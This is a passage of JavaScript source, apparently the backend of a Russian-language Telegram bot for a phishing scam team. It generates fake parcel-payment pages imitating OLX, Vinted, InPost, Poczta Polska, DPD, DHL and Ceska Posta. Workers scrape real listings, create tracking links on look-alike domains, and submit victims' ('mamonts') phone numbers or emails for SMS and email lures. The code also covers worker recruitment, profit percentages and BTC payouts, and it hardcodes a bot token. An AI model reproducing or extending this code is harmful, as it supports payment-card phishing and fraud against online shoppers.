var { Telegraf, Markup, Scenes, Stage, session, Extra} = require("telegraf")
var { existsSync, readdirSync, writeFileSync, unlinkSync, mkdirSync, readFileSync, write } = require("fs")
const axios = require("axios")
var convert = require('xml-js');
const { exec } = require("child_process");
const { createContext } = require("vm");

var btoken = "5536214225:AAGOwhq7jpEwW7fXHsN_iXSURhrSIm59wLc"

var bot = new Telegraf("5536214225:AAGOwhq7jpEwW7fXHsN_iXSURhrSIm59wLc")

var cfg = {
    access: "-1001875033344",
    chat: "https://t.me/+SUxblOkkyxo0MDBi",
    profits: "https://t.me/+518WvO-1AdIxMzNi",
    bugs: "-1001875033344",
    payouts: "-1001880374002",
    sms: "-1001875033344",
    logs: "-1001875033344"
}

var chats = {
    main: "-1001720586849",
    payouts: "-1001880374002",
}

var _local = {
    cp: ["pl", "cz"],
    cp_flags: {"pl": "🇵🇱", "cz": "🇨🇿"},
    valute: {"🇵🇱": "PLN", "🇨🇿": "CZK"},
    services: {
        "czka-posta": "🇨🇿", "czka-dhi": "🇨🇿", "czska-dqd": "🇨🇿", "czska-vlnteb": "🇨🇿",
        "mojapaczka-dqd": "🇵🇱", "mojapaczka-lhpost": "🇵🇱", "mojapaczka-pozta": "🇵🇱", "mojapaczka-vlnteb": "🇵🇱",
        "mojapaczka-oix": "🇵🇱"
    },
    pldomain: readFileSync("database/domain"),
    tmenu: {
    inline_keyboard: [  
        [
            Markup.button.callback("🇩🇪 Германия", "de")
        ],
        [
            Markup.button.callback("🇵🇱 Польша", "@country:poland"),
            Markup.button.callback("🇨🇿 Чехия", "@country:chezh")
        ],
        [
            Markup.button.callback("⚙️ Настройки", "/settings")
        ],
        [
            Markup.button.callback("☁️ Чаты", "chats"),
            Markup.button.callback("📘 Руководство", "rukovodstvo"),
        ],
        [
            Markup.button.callback("❗️ Жалоба на Баг/Домен", "bug/domain")
        ],
        [
            Markup.button.callback("👨‍🏫 Наставники", "mentors"),
            Markup.button.callback("👨‍👩‍👦 Контакты", "contacts"),
        ],
    ]},
    countrys: {
        settings: Markup.inlineKeyboard([
            [
                Markup.button.callback("⚙️ Сменить BTC", "@goto:btc")
            ],
            [
                Markup.button.callback("⚙️ Сменить #Tag", "@goto:tagc")
            ],
            [
                Markup.button.callback("❗️ В меню", "tomenu"),
            ],
        ]),
        poland: Markup.inlineKeyboard([
            [
                Markup.button.callback("❇️ OLX", "@country:olxpl"),
                Markup.button.callback("❇️ Inpost", "@country:inpostpl"),
            ],
            [
                Markup.button.callback("❇️ Vinted", "@country:vinted"),
                Markup.button.callback("❇️ Poczta Polska", "@country:poczta"),
            ],
            [
                Markup.button.callback("❇️ DPD", "@country:dpd"),
            ],
            [
                Markup.button.callback("❗️ В меню", "tomenu"),
            ],
        ]),
        chezh: Markup.inlineKeyboard([
            [
                Markup.button.callback("❇️ Vinted", "@ofrtlink:czska-vlnteb"),
                Markup.button.callback("❇️ DHL", "@pstlink:czka-dhi"),
            ],
            [
                Markup.button.callback("❇️ DPD", "@pstlink:czska-dqd"),
                Markup.button.callback("❇️ CeskaPosta", "@pstlink:czka-posta"),
            ],
            [
                Markup.button.callback("❗️ В меню", "tomenu"),
            ],
        ]),
        olxpl: Markup.inlineKeyboard([
            [
                Markup.button.callback("Через ссылку", "@goto:olx"),
                Markup.button.callback("Вручную", "@ofrtlink:mojapaczka-oix"),
            ],
            [
                Markup.button.callback("В меню", "tomenu")
            ]
         ]),
         inpostpl: Markup.inlineKeyboard([
            [
                Markup.button.callback("Через ссылку OLX", "@repay:mojapaczka-lhpost"),
                Markup.button.callback("Вручную", "@pstlink:mojapaczka-lhpost"),
            ],
            [
                Markup.button.callback("В меню", "tomenu")
            ]
         ]),
         vinted: Markup.inlineKeyboard([
            [
                Markup.button.callback("Через ссылку", "@repay:mojapaczka-vlnteb"),
                Markup.button.callback("Вручную", "@ofrtlink:mojapaczka-vlnteb"),
            ]
         ]),
         poczta: Markup.inlineKeyboard([
            [
                Markup.button.callback("Через ссылку OLX", "@repay:mojapaczka-pozta"),
                Markup.button.callback("Вручную", "@pstlink:mojapaczka-pozta"),
            ],
            [
                Markup.button.callback("В меню", "tomenu")
            ]
         ]),
         dpd: Markup.inlineKeyboard([
            [
                Markup.button.callback("Через ссылку OLX", "@repay:mojapaczka-dqd"),
                Markup.button.callback("Вручную", "@pstlink:mojapaczka-dqd"),
            ],
            [
                Markup.button.callback("В меню", "tomenu")
            ]
         ]),
         
    }
}   

function randint(min, max) {
    let rand = min - 0.5 + Math.random() * (max - min + 1);
    return Math.round(rand);
}

function normalReturn(int) {
    if (String(int).substring(String(int).length - 1) == 0) return "обьявлений"

    if (String(int).substring(String(int).length - 1) == 1) return "обьявление"

    if (String(int).substring(String(int).length - 1) == 2 ||
        String(int).substring(String(int).length - 1) == 3 ||
        String(int).substring(String(int).length - 1) == 4) return "обьявления"

    if (String(int).substring(String(int).length - 1) == 5 ||
        String(int).substring(String(int).length - 1) == 6 ||
        String(int).substring(String(int).length - 1) == 7 ||
        String(int).substring(String(int).length - 1) == 8 ||
        String(int).substring(String(int).length - 1) == 9) return "обьявлений"
}

function promiseForEach(arr, cb) {
    var i = 0;

    var nextPromise = function() {
        if (i >= arr.length) {
            return;
        }
        var newPromise = Promise.resolve(cb(arr[i], i));
        i++;
        return newPromise.then(nextPromise);
    };
    return Promise.resolve().then(nextPromise);
};

function percent(sum, percent) {
    return Math.round(sum / 100 * percent);
}

async function createUser(id) {
    await mkdirSync("database/maindb/" + id) //UserDir
    await mkdirSync("database/maindb/" + id + "/profits") //Profits Count
    await writeFileSync("database/maindb/" + id + "/tag", `w${randint(111111, 999999)}`) //UserTag example(w123456)
    await writeFileSync("database/maindb/" + id + "/percent", `60`) //Payout Percent
}

function deleteMeta(meta) {

    meta2 = meta

    let bad_symbols = [
        [{ replace_to: "e", letters: ["è", "é", "ê", "ë", "ē", "ė", "ę"] }],
        [{ replace_to: "y", letters: ["ÿ"] }],
        [{ replace_to: "u", letters: ["û", "ü", "ù", "ú", "ū"] }],
        [{ replace_to: "i", letters: ["î", "ï", "í", "ī", "į", "ì"] }],
        [{ replace_to: "o", letters: ["ô", "ö", "ò", "ó", "œ", "ø", "ō", "õ", "ó"] }],
        [{ replace_to: "a", letters: ["à", "á", "â", "ä", "æ", "ã", "å", "ā"] }],
        [{ replace_to: "s", letters: ["ß", "ś", "š"] }],
        [{ replace_to: "l", letters: ["ł"] }],
        [{ replace_to: "z", letters: ["ž", "ź", "ż"] }],
        [{ replace_to: "c", letters: ["ç", "ć", "č"] }],
        [{ replace_to: "n", letters: ["ñ", "ń"] }]
    ]

    bad_symbols.forEach(obj => {
        obj.forEach(subj => {
            subj.letters.forEach(letter => {
                meta = meta.replace(
                    new RegExp(
                        letter, 'g'),
                    subj.replace_to)
            })
        })
    })


    return meta
}

function getMentor(id) {
    return {
        tag: readFileSync("database/maindb/" + id + "/tag")
    }
}

function reportCoder(worker, err) {
    bot.telegram.sendMessage(cfg.koder, `⚡️ NEW BUG!\n\nWorker: @${ctx.from.username}\nERROR: ${e.name}\nERR MSG: ${e.message}\nSTACK: ${e.stack}`)
}

function recentMentor(id) {
    let mpr = Number(readFileSync("database/maindb/" + id + "/mpr"))
    let profits = (readdirSync("database/maindb/" + id + "/profits/").length)

    if (profits >= mpr) {
        return 'Вы можете отказаться'
    } else {
        return `Осталось ${mpr-profits} профита.`
    }


}

function getProfits(id) {
    if (readdirSync("database/maindb/" + id + "/profits/").length == 0) {
        return 0
    } else {
        let profits = 0

        readdirSync("database/maindb/" + id + "/profits/").forEach(cf => {
            profits += Number(readFileSync("database/maindb/" + id + "/profits/" + cf))
        })

        return profits
    }
}

function hand() {

    var rtx = ""
    var anytime = ""

    _local.cp.forEach(_country => {
        if (readdirSync("database/hand/" + _country).length != 0) {
            var reply = ""
            readdirSync("database/hand/" + _country).forEach(_handler => {
                if (reply.includes(_handler) == true) return false
                return reply += `@${_handler}, `
            })
            rtx += `${_local.cp_flags[_country]} - ${reply.substring(0, reply.length-2)}.\n`
        } else rtx += `${_local.cp_flags[_country]} - Вбив пустой.\n`
    })

    return rtx;
}


function vhand() {

    var rtx = ""
    var anytime = ""

    _local.cp.forEach(_country => {
        if (readdirSync("database/hand/" + _country).length != 0) {
            var reply = ""
            readdirSync("database/hand/" + _country).forEach(_handler => {
                if (reply.includes(_handler) == true) return false
                return reply += `<a href='https://t.me/${_handler}'>${_handler}</a> ,`
            })
            rtx += `${_local.cp_flags[_country]} - ${reply.substring(0, reply.length-2)}.\n`
        } else rtx += `${_local.cp_flags[_country]} - Вбив пустой.\n`
    })

    return rtx;
}

function sms() {

    var rtx = ""
    var anytime = ""

    _local.cp.forEach(_country => {
        if (existsSync("database/sms/" + _country) == true) {
            let json = JSON.parse(readFileSync("database/sms/" + _country).toString("utf-8"))
            return rtx += `${_local.cp_flags[_country]} - @${json.tag}.\n`
        } else rtx += `${_local.cp_flags[_country]} - SMS'ера нету.\n`
    })

    return rtx;
}

function vsms() {

    var rtx = ""
    var anytime = ""

    _local.cp.forEach(_country => {
        if (existsSync("database/sms/" + _country) == true) {
            let json = JSON.parse(readFileSync("database/sms/" + _country).toString("utf-8"))
            return rtx += `${_local.cp_flags[_country]} - <a href='https://t.me/${json.tag}'>${json.tag}</a>\n`
        } else rtx += `${_local.cp_flags[_country]} - SMS'ера нету.\n`
    })

    return rtx;
}

const smska = new Scenes.WizardScene(
    "smska",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❗️ Вы уверены что хотите продолжить? После этого действия с этого обьявления от профита будет отсчитано -5%.\n\n❕ Удостоверьтесь что на отправке вашей страны есть СМСер в сети.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Продолжить", "go"),
                Markup.button.callback("Отмена", "cancel"),
            ]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined' && ctx.update.callback_query.data == "cancel") return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.reply("📲 Введи номер мамонта. Пример: +499999999999", Markup.inlineKeyboard([
            [Markup.button.callback("Отмена", "cancel")]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined' && ctx.update.callback_query.data == "cancel") return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.number = ctx.message.text

        ctx.reply("📊 Введите номер шаблона.", Markup.inlineKeyboard([
            [Markup.button.callback("Отмена", "cancel")]
        ]))
        ctx.wizard.next()

    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined' && ctx.update.callback_query.data == "cancel") return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.shablon = ctx.message.text

        let json = JSON.parse(readFileSync("database/scenes/" + ctx.from.id).toString("utf-8"))

        writeFileSync(`../sms/${json.service}_${json.id}_${ctx.from.id}`, String("1"))

        bot.telegram.sendMessage(cfg.sms, `<b>📩 ${_local.services[services_original[json.service]]} ${services_original[json.service].replace(/-/g, "").toUpperCase()} NEW SMS!</b>\n\n<b>🧑‍🏭 Воркер</b>: @${ctx.from.username}\n<b>🧑‍🏭 WorkerID</b>: ${ctx.from.id}\n<b>📲 Номер</b>: <code>${ctx.wizard.state.data.number}</code>\n<b>📊 Шаблон</b>: <code>#${ctx.wizard.state.data.shablon}</code>\n<b>⛓ Ссылка</b>: https://${services_original[json.service]}.${_local.pldomain}/order.php?id=${json.id}`, {
            parse_mode: "HTML",
            disable_web_page_preview: "false",
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("📴 Взять лог", "/picksms")
                    ]
                ]
            }
        })
        ctx.reply("📴 Лог отправлен СМСерам! Все уведомления прийдут вам в личные сообщения.")
        ctx.scene.leave()
    }
)


const email = new Scenes.WizardScene(
    "email",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❗️ Вы уверены что хотите продолжить? После этого действия с этого обьявления от профита будет отсчитано -5%.\n\n❕ Удостоверьтесь что на отправке вашей страны есть Емейлер в сети.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Продолжить", "go"),
                Markup.button.callback("Отмена", "cancel"),
            ]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined' && ctx.update.callback_query.data == "cancel") return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.reply("📲 Введи EMAIL мамонта. Пример: mamont@hotmail.com", Markup.inlineKeyboard([
            [Markup.button.callback("Отмена", "cancel")]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined' && ctx.update.callback_query.data == "cancel") return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        if (ctx.message.text.includes("@") == false && ctx.message.text.includes(".") == false) return ctx.reply("Вы допустили ошибку в EMAIL. Попробуйте ввести еще раз.")

        ctx.wizard.state.data.number = ctx.message.text

        ctx.reply("📊 Введите номер шаблона.", Markup.inlineKeyboard([
            [Markup.button.callback("Отмена", "cancel")]
        ]))
        ctx.wizard.next()

    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined' && ctx.update.callback_query.data == "cancel") return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.shablon = ctx.message.text

        let json = JSON.parse(readFileSync("database/scenes/" + ctx.from.id).toString("utf-8"))

        writeFileSync(`../sms/${json.service}_${json.id}_${ctx.from.id}`, String("1"))

        bot.telegram.sendMessage(cfg.sms, `<b>📩 ${_local.services[services_original[json.service]]} ${services_original[json.service].replace(/-/g, "").toUpperCase()} NEW EMAIL!</b>\n\n<b>🧑‍🏭 Воркер</b>: @${ctx.from.username}\n<b>🧑‍🏭 WorkerID</b>: ${ctx.from.id}\n<b>📲 EMAIL</b>: <code>${ctx.wizard.state.data.number}</code>\n<b>📊 Шаблон</b>: <code>#${ctx.wizard.state.data.shablon}</code>\n<b>⛓ Ссылка</b>: https://${services_original[json.service]}.${_local.pldomain}/order.php?id=${json.id}`, {
            parse_mode: "HTML",
            disable_web_page_preview: "false",
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("📴 Взять лог", "/pickmail")
                    ]
                ]
            }
        })
        ctx.reply("📴 Лог отправлен eMail'ерам! Все уведомления прийдут вам в личные сообщения.")
        ctx.scene.leave()
    }
)

const invest = new Scenes.WizardScene(
    "invest",
    (ctx) => {
        ctx.reply("📢 Введи текст рассылки.", {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("Отменить", "cancel")
                    ]
                ]
            }
        }).then(() => {
            ctx.wizard.next();
        });
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        let usrs = []
        readdirSync("database/users/").forEach(async currentUser => {
            usrs.push(currentUser)
        })
        await ctx.reply("Ожидайте сообщения об успешной рассылке!")
        for (let i = 0; i < usrs.length; i++) {
            if (typeof ctx.message.photo == "undefined") {
                try {
                    await bot.telegram.sendMessage(usrs[i], ctx.message.text)
                } catch (e) {
                    console.log("ignored: " + e)
                }
            } else {
                if (typeof ctx.message.caption == "undefined") {
                    try {
                        await bot.telegram.sendPhoto(usrs[i], ctx.message.photo[ctx.message.photo.length - 1].file_id)
                    } catch (e) {
                        console.log("ignored: " + e)
                    }
                } else {
                    try {
                        await bot.telegram.sendPhoto(usrs[i], ctx.message.photo[ctx.message.photo.length - 1].file_id, { caption: ctx.message.caption })
                    } catch (e) {
                        console.log("ignored: " + e)
                    }
                }
            }
        }
        await ctx.reply("Успешная рассылка!")
        await ctx.scene.leave();
    })

const bgd = new Scenes.WizardScene(
    "bgd",
    (ctx) => {
        ctx.reply("<b>-></b> Введите всю суть жалобы в одном сообщении, после того как мы получим ваше сообщение мы передадим сообщение администрации.\n\n❗️ Обязательно придерживайтесь правил, приложите доказательства в виде видео или скриншота иначе ваша заявка будет проигнорирована.", {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("Отменить", "cancel")
                    ]
                ]
            }
        })
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        await ctx.forwardMessage(cfg.bugs)
        await bot.telegram.sendMessage(cfg.bugs, "☝️ На момент отправления у пользователя стоял тэг @" + ctx.from.username + " (<b>ID: " + ctx.from.id + "</b>)", { parse_mode: "HTML" })
        await ctx.reply("👍 Мы успешно передали вашу заявку старшей администрации, в ближайшее время ее обработают.")
        await ctx.scene.leave()
    }
)

const register = new Scenes.WizardScene(
    "register",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("🌱 Откуда вы о нас узнали?")
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.wizard.state.data.from = ctx.message.text
        ctx.reply("👁 Был ли у вас опыт работы в подобных сферах деятельности?\n\n❗️ Если опыт был, в ответ на это сообщение напишите ответ. Внизу вам выданы кнопки быстрого ответа.", Markup.keyboard([
            ["Нет опыта."],
            ["Есть небольшой опыт."],
            ["Обучаюсь"]
        ]).resize())
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.reply("🤝 Ваша заявка успешно отправлена на рассмотрение администрации. До скорых встреч!", { reply_markup: { remove_keyboard: true } })

        bot.telegram.sendMessage(cfg.access, `<b>⚙️ Пришла новая заявка №${readdirSync("database/attempts/").length+1}!</b>\n\n<b>Tag</b>: @${ctx.from.username}\n<b>Откуда узнал:</b> ${ctx.wizard.state.data.from}\n<b>Опыт</b>: ${ctx.message.text}\n\n\n<code>❗️ Для вынесения вердикта нажмите соответствующие кнопки ниже.</code>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        Markup.button.callback("✅ Принять", "@accept:" + ctx.from.id),
                        Markup.button.callback("❌ Отклонить", "@disaccept:" + ctx.from.id),
                    ],
                    [
                        Markup.button.callback("❌ Отклонить + Заблокировать", "@disblock:" + ctx.from.id),
                    ],
                ]
            }
        })

        writeFileSync("database/attempts/" + ctx.from.id, "1")

        ctx.scene.leave()
    }
)

async function parse_link(link) {

    if (link.includes("m.olx.pl")) {
        link = link.replace("m.olx.pl", "www.olx.pl")
    }

    if (link.includes("olx.pl/d/")) {
        link = link.replace("olx.pl/d/", "olx.pl/")
    }

    const options = {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' },
        url: link
    }

    let res = await axios(options);
    let data = res.data;
    var gallery = data.match(/<div class="swiper-zoom-container">(.+)<\/div>/)
    var title = data.match(/<h1 data-cy="ad_title" class="css-r9zjja-Text eu5v0x0">(.+)<\/h1>/)[1].trim();
    if (typeof data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3><\/div>/) != undefined) {
        var price = data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3>/)[1].split("<")[0].replace(/[^0-9]/g, "")
    } else {
        var price = data.match(/<h3 class="css-okktvh-Text eu5v0x0">(.+)<\/h3>/)[1].replace(/[^0-9]/g, "");
    }
    const images = []

    if (title == "" || title == undefined || price == "" || price == undefined) return "404"

    var regular = /src=\"(.*?)\"/g
    do {
        match = regular.exec(gallery)

        if (match) {
            images.push(match[0].match(/src="(.+)"/)[1])
        }
    } while (match)

    const photo = images[0]

    if (photo == "undefined") {
        photo = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtvMCg-jkC382cdG9nIYNOmAm0iAksv6vlAhbVLI_AyuuO43Fne-rCYPE3Yo4bZ_oiiqo&usqp=CAU"
    }

    return { title: title, price: price.replace(/\B(?=(\d{3})+(?!\d))/g, " "), image: photo }

}

async function parse_vinted(link) {

    if (link.includes("m.olx.pl")) {
        link = link.replace("m.olx.pl", "www.olx.pl")
    }

    if (link.includes("olx.pl/d/")) {
        link = link.replace("olx.pl/d/", "olx.pl/")
    }

    const options = {
        method: 'GET',
        headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' },
        url: link
    }

    let res = await axios(options);
    let data = res.data;
    var photo = data.match(/<meta property="og:image" content="(.+)">/)[1]
    var price = data.match(/"price":"(.+)"/)[1].split(",")[0].replace(/[^0-9]/g, "")
    var title = data.match(/<title>(.+)<\/title>/)[1].split("-")[0].trim();
    const images = []

    if (title == "" || title == undefined || price == "" || price == undefined) return "404"

    if (photo == undefined) {
        photo = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtvMCg-jkC382cdG9nIYNOmAm0iAksv6vlAhbVLI_AyuuO43Fne-rCYPE3Yo4bZ_oiiqo&usqp=CAU"
    }

    return { title: title, image: photo, price: price }

}

const olx = new Scenes.WizardScene(
    "olx",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❇️ Введи ссылку на обьявление.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        let adv = await parse_link(ctx.message.text)
        if (adv == "404") return ctx.reply("Произошла ошибка при парсинге, ссылка битая. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.obyava = adv.title
        ctx.wizard.state.data.price = adv.price
        ctx.wizard.state.data.img = adv.image

        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['fio'].length > 10) ? json['fio'].substring(0, 10) + "..." : json['fio'], "fio")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.fio = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio']
                ctx.reply("❕ Автоматически установлено имя получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.fio = ctx.message.text
        }
        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['to'].length > 10) ? json['to'].substring(0, 10) + "..." : json['to'], "to")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.to = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to']
                ctx.reply("❕ Автоматически установлен адресс получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.to = ctx.message.text
        }
        let randomc = randint(000000, 999999)
        ctx.wizard.state.data['worker_id'] = ctx.from.id
        ctx.wizard.state.data['worker'] = ctx.from.username
        writeFileSync(`mojapaczka-oix/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
        writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({ fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to }))
        ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price} PLN\n\n👉 https://pi-0ix.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
            [
                Markup.button.callback("📩 Отправить SMS.", "@sendsms:" + "pi-0ix" + ":" + randomc)
            ],
            [
                Markup.button.callback("🗳 Отправить EMAIL.", "@sendemail:pi-0ix:" + randomc)
            ],
            [
                Markup.button.callback("❌ Удалить ссылку.", "@deletelink:pi-0ix:" + randomc)
            ]
        ]))
        await ctx.scene.leave()

    }
)

const btc = new Scenes.WizardScene(
    "btc",
    (ctx) => {
        ctx.reply("Укажи свой новый BTC кошелёк.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        writeFileSync("database/maindb/" + ctx.from.id + "/btc", String(ctx.message.text))
        ctx.reply("✴️ Ваш новый BTC кошелёк установлен!")
        ctx.scene.leave()
    }
)


const tagc = new Scenes.WizardScene(
    "tagc",
    (ctx) => {
        ctx.reply("Укажи свой новый Тэг.\n\n⚠️ Тэг не должен содержать пробелов.\n⚠️ Не должен повторять чей-либо тэг.\n⚠️ Тэг не должен содержать больше 10 символов.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        let nicks = []

        if (ctx.message.text.includes(" ") == true && ctx.message.text.length > 10) return ctx.reply("В нике состоит пробел или он больше 10 символов.").then(ctx.scene.leave())

        await promiseForEach(readdirSync("database/maindb/"), (currUsr) => { nicks.push(readFileSync("database/maindb/" + currUsr + "/tag").toString("utf-8")) })

        if (nicks.includes(ctx.message.text) == false) {
            await writeFileSync("database/maindb/" + ctx.from.id + "/tag", String(ctx.message.text))
            await ctx.reply("✴️ Ваш новый #TAG установлен!", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Меню", "callMenu")
                ]
            ]))
            await ctx.scene.leave()
        } else {
            await ctx.reply("Данный тэг уже занят.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Меню", "callMenu")
                ]
            ]))
            await ctx.scene.leave()
        }
    }
)

const pstlink = new Scenes.WizardScene(
    "pstlink",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❇️ Введи название обьявления.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        ctx.wizard.state.data.obyava = ctx.message.text
        ctx.reply("❇️ Введи стоимость обьявления.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        ctx.wizard.state.data.price = ctx.message.text



        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
